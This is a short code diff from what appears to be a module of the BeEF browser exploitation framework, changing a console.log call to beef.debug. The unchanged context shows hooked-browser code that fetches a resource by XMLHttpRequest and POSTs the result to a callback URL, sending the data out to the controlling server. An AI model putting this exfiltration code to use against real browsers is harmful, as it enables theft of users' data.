@@ -27,7 +27,7 @@ beef.execute(function() {
                 xhr.responseType = 'arraybuffer'
                 xhr.onload = function(e) {
                     var blob = new Blob([this.response], {type: this.getResponseHeader('Content-Type')});
-                    console.log(blob);
+                    beef.debug(blob);
                     xhr_cb = new XMLHttpRequest();
                     xhr_cb.open('POST', url_callback+'que=req&&path='+path, false);
                     xhr_cb.send(blob);
